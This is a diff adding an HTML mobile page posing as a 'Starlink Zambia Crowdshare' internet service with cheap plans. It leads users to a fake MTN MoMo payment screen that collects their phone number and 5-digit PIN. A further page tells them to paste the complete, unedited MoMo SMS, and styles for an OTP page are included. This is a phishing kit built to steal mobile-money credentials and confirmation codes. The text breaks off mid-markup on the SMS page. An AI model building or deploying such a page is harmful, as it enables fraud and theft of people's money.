@@ -1,0 +1,1469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Starlink Zambia — Crowdshare</title>
+<style>
+  :root{
+    --bg:#eef0f3;
+    --card-bg:#ffffff;
+    --ink:#161a23;
+    --muted:#6b7280;
+    --accent-1:#f6b93b;
+    --accent-2:#f0932b;
+    --blue:#2f5fe0;
+    --blue-dark:#1c3fb0;
+    --blue-soft:#e7edfd;
+    --border:#e3e6eb;
+    --nav-active:#2f5fe0;
+    --green:#1a9e5c;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;}
+  body{
+    background:var(--bg);
+    font-family:'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+    color:var(--ink);
+    display:flex;
+    justify-content:center;
+  }
+  .phone{
+    width:100%;
+    max-width:430px;
+    min-height:100vh;
+    background:var(--bg);
+    display:flex;
+    flex-direction:column;
+  }
+  .topbar{
+    background:#0d0f14;
+    color:#fff;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:18px 16px 22px;
+  }
+  .topbar .brand{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    font-weight:700;
+    letter-spacing:0.5px;
+  }
+  .topbar .brand svg{width:26px;height:26px;flex-shrink:0;}
+  .content{
+    flex:1;
+    padding:20px 18px 100px;
+  }
+  .page{display:none;}
+  .page.active{display:block;}
+
+  /* ---- Plans page ---- */
+  .hero{
+    background:linear-gradient(135deg, var(--accent-1), var(--accent-2));
+    border-radius:22px;
+    padding:32px 26px 34px;
+    text-align:center;
+    box-shadow:0 12px 24px -10px rgba(240,147,43,0.45);
+  }
+  .hero h1{
+    color:#fff;
+    font-size:1.7rem;
+    margin:0 0 16px;
+    font-weight:800;
+    text-shadow:0 1px 2px rgba(0,0,0,0.08);
+  }
+  .hero p{
+    margin:0;
+    font-size:0.98rem;
+    line-height:1.65;
+    color:#2a2010;
+  }
+  .hero p b{font-weight:700;}
+  .section-title{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    margin:32px 0 16px;
+    font-size:1.3rem;
+    font-weight:800;
+  }
+  .section-title svg{width:22px;height:22px;color:var(--blue);flex-shrink:0;}
+  .plans{
+    display:flex;
+    flex-direction:column;
+    gap:16px;
+  }
+  .plan-card{
+    background:var(--card-bg);
+    border:1px solid var(--border);
+    border-radius:18px;
+    padding:20px 20px 22px;
+    box-shadow:0 6px 14px -10px rgba(20,20,40,0.15);
+    cursor:pointer;
+    transition:transform 0.15s ease;
+  }
+  .plan-card:active{
+    transform:scale(0.98);
+  }
+  .plan-head{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:10px;
+    margin-bottom:10px;
+  }
+  .plan-name{
+    font-size:1.15rem;
+    font-weight:800;
+    flex-shrink:0;
+  }
+  .plan-badge{
+    background:var(--blue-soft);
+    color:var(--blue);
+    font-weight:700;
+    font-size:0.85rem;
+    padding:5px 14px;
+    border-radius:999px;
+    white-space:nowrap;
+    flex-shrink:0;
+  }
+  .plan-desc{
+    color:var(--muted);
+    font-size:0.95rem;
+    margin:0 0 18px;
+    line-height:1.5;
+  }
+  .plan-price{
+    font-size:1.65rem;
+    font-weight:800;
+  }
+  .plan-price span{
+    font-size:0.95rem;
+    font-weight:500;
+    color:var(--muted);
+    margin-left:2px;
+  }
+
+  /* ---- Status page ---- */
+  .package-btn{
+    width:100%;
+    background:linear-gradient(135deg, var(--blue), var(--blue-dark));
+    color:#fff;
+    border:none;
+    border-radius:16px;
+    padding:18px 20px;
+    font-size:1.05rem;
+    font-weight:800;
+    letter-spacing:0.5px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:12px;
+    box-shadow:0 10px 20px -8px rgba(47,95,224,0.55);
+    cursor:pointer;
+  }
+  .package-btn svg{width:20px;height:20px;}
+
+  .service-card{
+    background:linear-gradient(160deg,#12141c,#0a0b10);
+    border-radius:20px;
+    padding:24px 22px;
+    margin-top:18px;
+    position:relative;
+    overflow:hidden;
+  }
+  .service-eyebrow{
+    color:#7fa0f7;
+    font-size:0.8rem;
+    font-weight:700;
+    letter-spacing:1px;
+    text-transform:uppercase;
+    margin-bottom:6px;
+  }
+  .service-title-row{
+    display:flex;
+    align-items:flex-start;
+    justify-content:space-between;
+    gap:12px;
+  }
+  .service-title{
+    color:#fff;
+    font-size:1.35rem;
+    font-weight:800;
+  }
+  .service-dot{
+    width:44px;
+    height:44px;
+    border-radius:50%;
+    background:var(--blue);
+    flex-shrink:0;
+    box-shadow:0 0 0 6px rgba(47,95,224,0.18);
+  }
+  .service-sub{
+    color:#a6acb8;
+    font-size:0.92rem;
+    margin-top:10px;
+    line-height:1.5;
+  }
+
+  .stat-grid{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:16px;
+    margin-top:18px;
+  }
+  .stat-card{
+    background:var(--card-bg);
+    border:1px solid var(--border);
+    border-radius:16px;
+    padding:18px 18px 20px;
+  }
+  .stat-label{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    color:var(--muted);
+    font-size:0.82rem;
+    font-weight:700;
+    letter-spacing:0.5px;
+    text-transform:uppercase;
+    margin-bottom:10px;
+  }
+  .stat-label svg{width:16px;height:16px;}
+  .stat-value{
+    font-size:1.7rem;
+    font-weight:800;
+  }
+  .stat-unit{
+    color:var(--muted);
+    font-size:0.85rem;
+    margin-top:2px;
+  }
+
+  .usage-card{
+    background:var(--card-bg);
+    border:1px solid var(--border);
+    border-radius:18px;
+    padding:22px 20px;
+    margin-top:16px;
+  }
+  .usage-head{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    margin-bottom:16px;
+  }
+  .usage-title{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    font-size:1.05rem;
+    font-weight:800;
+  }
+  .usage-title svg{width:20px;height:20px;color:var(--blue);}
+  .usage-pct{
+    background:#eef0f3;
+    color:var(--ink);
+    font-weight:700;
+    font-size:0.85rem;
+    padding:4px 12px;
+    border-radius:999px;
+  }
+  .usage-bar{
+    height:10px;
+    background:#e3e6eb;
+    border-radius:999px;
+    overflow:hidden;
+  }
+  .usage-fill{
+    height:100%;
+    width:42%;
+    background:linear-gradient(90deg, var(--blue), var(--blue-dark));
+    border-radius:999px;
+  }
+  .usage-labels{
+    display:flex;
+    justify-content:space-between;
+    margin-top:10px;
+    color:var(--muted);
+    font-size:0.9rem;
+  }
+
+  .diagnostic-btn{
+    width:100%;
+    background:var(--card-bg);
+    border:1px solid var(--border);
+    border-radius:16px;
+    padding:16px 20px;
+    margin-top:16px;
+    font-size:1rem;
+    font-weight:700;
+    color:var(--ink);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+    cursor:pointer;
+  }
+  .diagnostic-btn svg{width:18px;height:18px;color:var(--blue);}
+
+  /* ---- Payment processing modal ---- */
+  .content.blurred{
+    filter:blur(4px);
+    pointer-events:none;
+    user-select:none;
+  }
+  .modal-overlay{
+    display:none;
+    position:fixed;
+    inset:0;
+    background:rgba(20,22,28,0.45);
+    align-items:center;
+    justify-content:center;
+    z-index:50;
+    padding:24px;
+  }
+  .modal-overlay.active{display:flex;}
+  .modal-card{
+    background:#fff;
+    border-radius:20px;
+    padding:40px 28px 34px;
+    max-width:360px;
+    width:100%;
+    text-align:center;
+    box-shadow:0 24px 48px -12px rgba(0,0,0,0.35);
+  }
+  .approval-overlay{
+    display:none;
+    position:fixed;
+    inset:0;
+    background:rgba(17,18,23,0.55);
+    align-items:center;
+    justify-content:center;
+    z-index:55;
+    padding:24px;
+  }
+  .approval-overlay.active{display:flex;}
+  .approval-card{
+    background:#fff;
+    border-radius:22px;
+    width:100%;
+    max-width:360px;
+    padding:28px 22px 24px;
+    text-align:center;
+    box-shadow:0 18px 40px -12px rgba(0,0,0,0.34);
+  }
+  .approval-spinner{
+    width:70px;
+    height:70px;
+    margin:0 auto 18px;
+    border-radius:50%;
+    border:5px solid rgba(47,95,224,0.15);
+    border-top-color:var(--blue);
+    animation:spin 0.9s linear infinite;
+  }
+  .approval-title{
+    margin:0 0 10px;
+    font-size:1.5rem;
+    font-weight:900;
+    color:var(--ink);
+  }
+  .approval-subtitle{
+    color:#4b5563;
+    font-size:0.98rem;
+    line-height:1.5;
+    margin:0 0 16px;
+  }
+  .approval-summary{
+    background:#f5f7fb;
+    border:1px solid var(--border);
+    border-radius:14px;
+    padding:12px 14px;
+    margin-bottom:18px;
+    text-align:left;
+  }
+  .approval-summary-row{
+    display:flex;
+    justify-content:space-between;
+    gap:12px;
+    font-size:0.92rem;
+    padding:6px 0;
+  }
+  .approval-summary-row span{color:var(--muted);}
+  .approval-summary-row strong{font-weight:800; color:var(--ink); text-align:right;}
+  .spinner{
+    width:64px;
+    height:64px;
+    margin:0 auto 22px;
+    border-radius:50%;
+    border:5px solid #f1e2c0;
+    border-top-color:var(--accent-1);
+    animation:spin 0.9s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg);}}
+  .momo-logo{
+    width:100%;
+    max-width:220px;
+    margin:0 auto 22px;
+  }
+  .momo-logo svg{display:block;width:100%;height:auto;}
+  .modal-title{
+    font-size:1.4rem;
+    font-weight:800;
+    margin-bottom:10px;
+  }
+  .modal-desc{
+    color:#4b5563;
+    font-size:0.98rem;
+    line-height:1.5;
+    margin-bottom:16px;
+  }
+  .modal-note{
+    color:var(--muted);
+    font-size:0.88rem;
+  }
+
+  .momo-back-btn{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    width:36px;
+    height:36px;
+    border-radius:50%;
+    border:1px solid var(--border);
+    background:var(--card-bg);
+    color:var(--ink);
+    cursor:pointer;
+    margin-bottom:14px;
+  }
+  .momo-back-btn svg{width:18px;height:18px;}
+
+  /* ---- SMS verification page ---- */
+  .sms-header{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:12px;
+    padding:18px 0 8px;
+    font-weight:800;
+  }
+  .sms-back-link{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    background:none;
+    border:none;
+    font:inherit;
+    color:var(--ink);
+    cursor:pointer;
+    font-size:1.05rem;
+    font-weight:700;
+    padding:0;
+  }
+  .sms-back-link svg{width:20px;height:20px;}
+  .sms-total{
+    color:#f28a1b;
+    font-size:1.1rem;
+    font-weight:800;
+    letter-spacing:0.3px;
+  }
+  .sms-title{
+    font-size:2.1rem;
+    font-weight:900;
+    line-height:1.1;
+    margin:18px 0 12px;
+    letter-spacing:-0.06em;
+  }
+  .sms-description{
+    font-size:1.05rem;
+    color:#3c4552;
+    line-height:1.45;
+    margin:0;
+  }
+  .sms-send-to{
+    text-align:center;
+    margin:26px 0 20px;
+    color:var(--muted);
+    font-size:0.82rem;
+    font-weight:700;
+    letter-spacing:0.14em;
+    text-transform:uppercase;
+  }
+  .sms-send-to strong{
+    display:block;
+    margin-top:6px;
+    color:var(--ink);
+    font-size:1.15rem;
+    letter-spacing:0.02em;
+    text-transform:none;
+  }
+  .sms-warning{
+    display:flex;
+    align-items:center;
+    gap:12px;
+    background:#f5e7d7;
+    border:1px solid #f0c08d;
+    border-radius:16px;
+    color:#d76900;
+    font-size:1.08rem;
+    font-weight:800;
+    line-height:1.35;
+    padding:18px 16px;
+    margin:0 0 24px;
+  }
+  .sms-warning .warn-icon{
+    width:26px;
+    height:26px;
+    display:inline-flex;
+    align-items:center;
+    justify-content:center;
+    border-radius:50%;
+    background:#f28a1b;
+    color:#fff;
+    font-size:1rem;
+    flex-shrink:0;
+  }
+  .sms-label{
+    display:block;
+    color:var(--muted);
+    font-size:0.78rem;
+    font-weight:800;
+    letter-spacing:0.18em;
+    text-transform:uppercase;
+    margin-bottom:12px;
+  }
+  .sms-textarea{
+    width:100%;
+    min-height:116px;
+    border:1px solid var(--border);
+    border-radius:14px;
+    background:#f5f6f8;
+    color:var(--ink);
+    padding:18px 16px;
+    resize:vertical;
+    font:inherit;
+    font-size:1.05rem;
+    line-height:1.5;
+    outline:none;
+  }
+  .sms-textarea::placeholder{color:#9aa0ac;}
+  .sms-counter{
+    color:var(--muted);
+    font-size:1rem;
+    margin:10px 0 24px;
+    text-align:left;
+  }
+  .sms-next-btn{
+    width:100%;
+    background:linear-gradient(135deg, #f6a526, #f07b16);
+    color:#fff;
+    border:none;
+    border-radius:16px;
+    padding:18px 20px;
+    font-size:1.1rem;
+    font-weight:900;
+    cursor:pointer;
+    box-shadow:0 12px 18px -12px rgba(240,123,22,0.8);
+  }
+
+  /* ---- OTP verification page ---- */
+  .otp-header{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:12px;
+    padding:18px 0 8px;
+    font-weight:800;
+  }
+  .otp-back-link{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    background:none;
+    border:none;
+    font:inherit;
+    color:var(--ink);
+    cursor:pointer;
+    font-size:1.05rem;
+    font-weight:700;
+    padding:0;
+  }
+  .otp-back-link svg{width:20px;height:20px;}
+  .otp-total{
+    color:#f28a1b;
+    font-size:1.1rem;
+    font-weight:800;
+    letter-spacing:0.3px;
+  }
+  .otp-instruction{
+    margin:16px 0 18px;
+    font-size:1.04rem;
+    color:#3d4651;
+    line-height:1.35;
+  }
+  .otp-send-to{
+    text-align:center;
+    margin:10px 0 26px;
+    color:var(--muted);
+    font-size:0.82rem;
+    font-weight:700;
+    letter-spacing:0.14em;
+    text-transform:uppercase;
+  }
+  .otp-send-to strong{
+    display:block;
+    margin-top:8px;
+    font-size:1.15rem;
+    letter-spacing:0.02em;
+    color:var(--ink);
+    text-transform:none;
+  }
+  .otp-label{
+    display:block;
+    color:var(--muted);
+    font-size:0.78rem;
+    font-weight:800;
+    letter-spacing:0.18em;
+    text-transform:uppercase;
+    margin-bottom:14px;
+  }
+  .otp-inputs{
+    display:grid;
+    grid-template-columns:repeat(4, minmax(0,1fr));
+    gap:12px;
+    margin-bottom:24px;
+  }
+  .otp-inputs input{
+    width:100%;
+    height:72px;
+    border:1px solid var(--border);
+    border-radius:12px;
+    text-align:center;
+    font-size:1.6rem;
+    font-weight:700;
+    color:var(--ink);
+    background:#f7f7f8;
+    outline:none;
+  }
+  .otp-verify-btn{
+    width:100%;
+    background:linear-gradient(135deg, #f6a526, #f07b16);
+    color:#fff;
+    border:none;
+    border-radius:16px;
+    padding:18px 20px;
+    font-size:1.1rem;
+    font-weight:900;
+    cursor:pointer;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+    box-shadow:0 12px 18px -12px rgba(240,123,22,0.8);
+  }
+  .otp-verify-btn svg{width:18px;height:18px;}
+  .otp-secure{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+    color:var(--muted);
+    font-size:0.82rem;
+    font-weight:700;
+    letter-spacing:0.5px;
+    margin-top:20px;
+  }
+  .otp-secure svg{width:16px;height:16px;color:var(--green);}
+
+  /* ---- Completion page ---- */
+  .complete-page{
+    padding-top:42px;
+    text-align:center;
+  }
+  .complete-check{
+    width:82px;
+    height:82px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin:0 auto 24px;
+    border-radius:50%;
+    background:#e5f5ec;
+    color:var(--green);
+  }
+  .complete-check svg{width:42px;height:42px;}
+  .complete-title{
+    margin:0 0 10px;
+    font-size:1.8rem;
+    font-weight:900;
+  }
+  .complete-description{
+    margin:0 auto;
+    max-width:290px;
+    color:var(--muted);
+    font-size:1rem;
+    line-height:1.5;
+  }
+  .complete-details{
+    margin:30px 0 26px;
+    padding:18px 0;
+    border-top:1px solid var(--border);
+    border-bottom:1px solid var(--border);
+  }
+  .complete-detail-row{
+    display:flex;
+    justify-content:space-between;
+    gap:16px;
+    padding:8px 0;
+    text-align:left;
+  }
+  .complete-detail-row span{color:var(--muted);}
+  .complete-detail-row strong{text-align:right;}
+  .complete-home-btn{
+    width:100%;
+    border:0;
+    border-radius:14px;
+    padding:17px 20px;
+    background:var(--blue);
+    color:#fff;
+    font:inherit;
+    font-weight:800;
+    cursor:pointer;
+  }
+
+  /* ---- Toast ---- */
+  .toast{
+    position:fixed;
+    left:50%;
+    bottom:96px;
+    transform:translate(-50%, 16px);
+    max-width:380px;
+    width:calc(100% - 48px);
+    background:#161a23;
+    color:#fff;
+    font-size:0.9rem;
+    font-weight:600;
+    padding:13px 18px;
+    border-radius:12px;
+    text-align:center;
+    box-shadow:0 12px 24px -8px rgba(0,0,0,0.4);
+    opacity:0;
+    pointer-events:none;
+    transition:opacity 0.2s ease, transform 0.2s ease;
+    z-index:60;
+  }
+  .toast.show{opacity:1; transform:translate(-50%, 0);}
+
+  /* ---- MTN MoMo payment page ---- */
+  .momo-hero{
+    background:#111820;
+    border-radius:22px 22px 0 0;
+    padding:30px 20px 26px;
+    text-align:center;
+    margin:0 -18px;
+  }
+  .momo-hero .momo-brand-logo{width:100%;max-width:270px;height:auto;}
+  .momo-panel{
+    background:var(--card-bg);
+    margin:0 -18px;
+    padding:32px 24px 26px;
+    text-align:center;
+  }
+  .momo-amount-label{
+    color:var(--muted);
+    font-size:0.8rem;
+    font-weight:700;
+    letter-spacing:1px;
+    text-transform:uppercase;
+    margin-bottom:6px;
+  }
+  .momo-amount{
+    font-size:2.2rem;
+    font-weight:800;
+    margin-bottom:18px;
+  }
+  .momo-service-label{
+    color:var(--muted);
+    font-size:0.8rem;
+    font-weight:700;
+    letter-spacing:1px;
+    text-transform:uppercase;
+    margin-bottom:4px;
+  }
+  .momo-service{
+    font-size:1.1rem;
+    font-weight:800;
+  }
+  .momo-divider{
+    border:none;
+    border-top:1px solid var(--border);
+    margin:26px 0;
+  }
+  .momo-instruction{
+    color:#4b5563;
+    font-size:1rem;
+    margin-bottom:26px;
+  }
+  .momo-field-label{
+    text-align:left;
+    font-weight:800;
+    font-size:0.98rem;
+    margin-bottom:10px;
+  }
+  .momo-phone-row{
+    display:flex;
+    align-items:stretch;
+    border:1px solid var(--border);
+    border-radius:12px;
+    overflow:hidden;
+    margin-bottom:22px;
+  }
+  .momo-flag{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    padding:0 14px;
+    background:#f5f6f8;
+    font-weight:700;
+    border-right:1px solid var(--border);
+    white-space:nowrap;
+  }
+  .momo-flag svg{width:22px;height:16px;border-radius:2px;flex-shrink:0;}
+  .momo-phone-row input{
+    border:none;
+    outline:none;
+    flex:1;
+    padding:16px 14px;
+    font-size:1.05rem;
+    font-family:inherit;
+    color:var(--ink);
+    min-width:0;
+  }
+  .momo-phone-row input::placeholder{color:#9ca3af;}
+  .momo-pin-input{
+    width:100%;
+    border:1px solid var(--border);
+    border-radius:12px;
+    padding:18px 14px;
+    font-size:1.6rem;
+    letter-spacing:14px;
+    text-align:center;
+    font-family:inherit;
+    outline:none;
+    color:var(--ink);
+  }
+  .momo-pin-hint{
+    color:var(--muted);
+    font-size:0.9rem;
+    margin:10px 0 24px;
+  }
+  .momo-confirm-btn{
+    width:100%;
+    background:linear-gradient(135deg, var(--accent-1), var(--accent-2));
+    border:none;
+    border-radius:14px;
+    padding:18px 20px;
+    font-size:1.05rem;
+    font-weight:800;
+    letter-spacing:0.5px;
+    color:var(--ink);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:10px;
+    cursor:pointer;
+    box-shadow:0 10px 20px -10px rgba(240,147,43,0.6);
+  }
+  .momo-confirm-btn svg{width:20px;height:20px;}
+  .momo-secure{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:8px;
+    color:var(--muted);
+    font-size:0.82rem;
+    font-weight:700;
+    letter-spacing:0.5px;
+    margin-top:20px;
+  }
+  .momo-secure svg{width:16px;height:16px;color:var(--green);}
+
+  /* ---- Bottom nav ---- */
+  .bottom-nav{
+    position:fixed;
+    left:50%;
+    transform:translateX(-50%);
+    bottom:0;
+    width:100%;
+    max-width:430px;
+    background:#fff;
+    border-top:1px solid var(--border);
+    display:flex;
+    justify-content:space-around;
+    padding:10px 0 16px;
+  }
+  .nav-item{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:4px;
+    font-size:0.78rem;
+    color:var(--muted);
+    background:none;
+    border:none;
+    font-family:inherit;
+    cursor:pointer;
+    padding:4px 8px;
+  }
+  .nav-item svg{width:22px;height:22px;}
+  .nav-item.active{color:var(--nav-active);font-weight:700;}
+</style>
+</head>
+<body>
+<div class="phone">
+
+  <div class="topbar">
+    <div class="brand">
+      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M3 21L21 3M14 3h7v7M3 14v7h7" stroke="#fff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      Starlink Zambia
+    </div>
+  </div>
+
+  <div class="content">
+
+    <!-- STATUS PAGE -->
+    <div class="page active" id="page-status">
+
+      <button class="package-btn" onclick="showPage('plans')">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6 7V5a2 2 0 012-2h8a2 2 0 012 2v2M4 7h16l-1 13H5L4 7z" stroke="#fff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Choose Your Package
+      </button>
+
+      <div class="service-card">
+        <div class="service-eyebrow">Service Information</div>
+        <div class="service-title-row">
+          <div class="service-title">Starlink Zambia</div>
+          <div class="service-dot"></div>
+        </div>
+        <div class="service-sub">Select a plan to activate high-speed satellite internet.</div>
+      </div>
+
+      <div class="stat-grid">
+        <div class="stat-card">
+          <div class="stat-label">Download <svg viewBox="0 0 24 24" fill="none" stroke="var(--blue)" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 4v14M6 12l6 6 6-6"/></svg></div>
+          <div class="stat-value">182.08</div>
+          <div class="stat-unit">Mbps</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Upload <svg viewBox="0 0 24 24" fill="none" stroke="var(--green)" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 20V6M6 12l6-6 6 6"/></svg></div>
+          <div class="stat-value">28.54</div>
+          <div class="stat-unit">Mbps</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Ping</div>
+          <div class="stat-value">36</div>
+          <div class="stat-unit">ms</div>
+        </div>
+        <div class="stat-card">
+          <div class="stat-label">Jitter</div>
+          <div class="stat-value">5</div>
+          <div class="stat-unit">ms</div>
+        </div>
+      </div>
+
+      <div class="usage-card">
+        <div class="usage-head">
+          <div class="usage-title">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><ellipse cx="12" cy="5" rx="8" ry="3" stroke="currentColor" stroke-width="1.8"/><path d="M4 5v6c0 1.66 3.58 3 8 3s8-1.34 8-3V5M4 11v6c0 1.66 3.58 3 8 3s8-1.34 8-3v-6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+            Data Usage
+          </div>
+          <div class="usage-pct">42%</div>
+        </div>
+        <div class="usage-bar"><div class="usage-fill"></div></div>
+        <div class="usage-labels">
+          <span>42.3 GB</span>
+          <span>100 GB</span>
+        </div>
+      </div>
+
+      <button class="diagnostic-btn" onclick="runDiagnostic(this)">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M13 2L3 14h7l-1 8 10-12h-7l1-8z" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        Run Diagnostic Test
+      </button>
+
+    </div>
+
+    <!-- PLANS PAGE -->
+    <div class="page" id="page-plans">
+
+      <div class="hero">
+        <h1>High-Speed Internet</h1>
+        <p>Experience the future of connectivity with our <b>Shared Satellite Network</b>. Using advanced <b>Crowdsharing Technology</b>, we deliver high-speed Starlink data directly to your smartphone, anywhere in Zambia. Choose your plan and join the network instantly using MTN MoMo.</p>
+      </div>
+
+      <div class="section-title">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <path d="M3 7l1.5-3h15L21 7M3 7h18M3 7v11a2 2 0 002 2h14a2 2 0 002-2V7" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+        Select Your Plan
+      </div>
+
+      <div class="plans">
+
+        <div class="plan-card" onclick="startPayment('Basic Plan', 15)">
+          <div class="plan-head">
+            <div class="plan-name">Basic Plan</div>
+            <div class="plan-badge">50GB</div>
+          </div>
+          <p class="plan-desc">Up to 12 devices. Perfect for small households.</p>
+          <div class="plan-price">ZMW 15.00<span>/month</span></div>
+        </div>
+
+        <div class="plan-card" onclick="startPayment('Standard Plan', 25)">
+          <div class="plan-head">
+            <div class="plan-name">Standard Plan</div>
+            <div class="plan-badge">100GB</div>
+          </div>
+          <p class="plan-desc">Up to 25 devices. High-speed, low-latency internet.</p>
+          <div class="plan-price">ZMW 25.00<span>/month</span></div>
+        </div>
+
+        <div class="plan-card" onclick="startPayment('Premium Plan', 45)">
+          <div class="plan-head">
+            <div class="plan-name">Premium Plan</div>
+            <div class="plan-badge">250GB</div>
+          </div>
+          <p class="plan-desc">Up to 50 devices. Best for high-demand users.</p>
+          <div class="plan-price">ZMW 45.00<span>/month</span></div>
+        </div>
+
+        <div class="plan-card" onclick="startPayment('Unlimited Plan', 95)">
+          <div class="plan-head">
+            <div class="plan-name">Unlimited Plan</div>
+            <div class="plan-badge">Truly Unlimited</div>
+          </div>
+          <p class="plan-desc">Unlimited devices. Maximum performance for power users.</p>
+          <div class="plan-price">ZMW 95.00<span>/month</span></div>
+        </div>
+
+      </div>
+
+    </div>
+
+    <!-- MTN MOMO PAYMENT PAGE -->
+    <div class="page" id="page-payment">
+      <button class="momo-back-btn" onclick="showPage('plans')" aria-label="Back to plans">
+        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18l-6-6 6-6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </button>
+      <div class="momo-hero">
+        <svg class="momo-brand-logo" viewBox="0 0 620 280" role="img" aria-label="MTN MoMo from MTN" xmlns="http://www.w3.org/2000/svg">
+          <defs><linearGradient id="momo-blue" x1="0" y1="0" x2="1" y2="1"><stop stop-color="#00658a"/><stop offset="1" stop-color="#00334c"/></linearGradient></defs>
+          <rect x="40" y="40" width="214" height="214" rx="36" fill="url(#momo-blue)"/>
+          <path d="M40 218h214v7a29 29 0 0 1-29 29H69a29 29 0 0 1-29-29z" fill="#ffcc00"/>
+          <path d="M126 83 168 38c24 29 38 64 39 104-19-28-47-49-81-59zM84 147l42-64c39 20 65 61 75 126-33-30-72-51-117-62z" fill="#ffcc00"/>
+          <circle cx="134" cy="130" r="19" fill="#004d6b"/>
+          <text x="292" y="151" fill="#ffcc00" font-family="Arial, sans-serif" font-size="96" font-weight="900" letter-spacing="-5">MoMo</text>
+          <text x="296" y="199" fill="#ffcc00" font-family="Arial, sans-serif" font-size="38" font-weight="800">from MTN</text>
+        </svg>
+      </div>
+
+      <div class="momo-panel">
+        <div class="momo-amount-label">Amount</div>
+        <div class="momo-amount" id="momo-amount">ZMW 45.00</div>
+        <div class="momo-service-label">Service</div>
+        <div class="momo-service" id="momo-service">Starlink Renewal</div>
+
+        <hr class="momo-divider">
+
+        <p class="momo-instruction">Enter your MTN MoMo details to authorize</p>
+
+        <div class="momo-field-label">MTN MoMo Number</div>
+        <div class="momo-phone-row">
+          <div class="momo-flag">
+            <svg viewBox="0 0 30 20" xmlns="http://www.w3.org/2000/svg">
+              <rect width="30" height="20" fill="#198a00"/>
+              <rect x="19" width="11" height="20" fill="#de2010"/>
+              <rect x="19" width="11" height="6.6" fill="#ef7d00"/>
+              <rect x="19" y="13.3" width="11" height="6.7" fill="#000"/>
+              <polygon points="10,5 11.5,9 15.5,9 12.2,11.3 13.5,15 10,12.6 6.5,15 7.8,11.3 4.5,9 8.5,9" fill="#de2010"/>
+            </svg>
+            +260
+          </div>
+          <input type="tel" inputmode="numeric" placeholder="77xxxxxxx" maxlength="9">
+        </div>
+
+        <div class="momo-field-label">Enter PIN</div>
+        <input type="password" inputmode="numeric" maxlength="5" class="momo-pin-input" placeholder="•••••">
+        <div class="momo-pin-hint">enter 5 digits</div>
+
+        <button class="momo-confirm-btn" onclick="confirmPayment()">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="9" stroke="currentColor" stroke-width="1.8"/><path d="M8.5 12.5l2.5 2.5 5-5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          Confirm Payment
+        </button>
+
+        <div class="momo-secure">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2l8 4v6c0 5-3.5 8.5-8 10-4.5-1.5-8-5-8-10V6l8-4z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/><path d="M9 12l2 2 4-4" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          SSL Encrypted &amp; Secure
+        </div>
+      </div>
+    </div>
+
+    <div class="page" id="page-sms">
+      <div class="sms-header">
+        <button class="sms-back-link" onclick="showPage('payment')" type="button">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 18l-6-6 6-6" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          Back
+        </button>
+        <div class="sms-total">ZMW 15.00</div>
+      </div>
+
+      <h1 class="sms-title">Full SMS Verification</h1>
+      <p class="sms-description">Please paste the full SMS content you received from MTN MoMo.</p>
+
+      <div class="sms-send-to">
+        Sending To
+        <strong>928566666</strong>
+      </div>
+
+      <div class="sms-warning">
+        <span class="warn-icon">!</span>
+        <span>DO NOT edit the SMS — only copy and paste the entire message below</span>
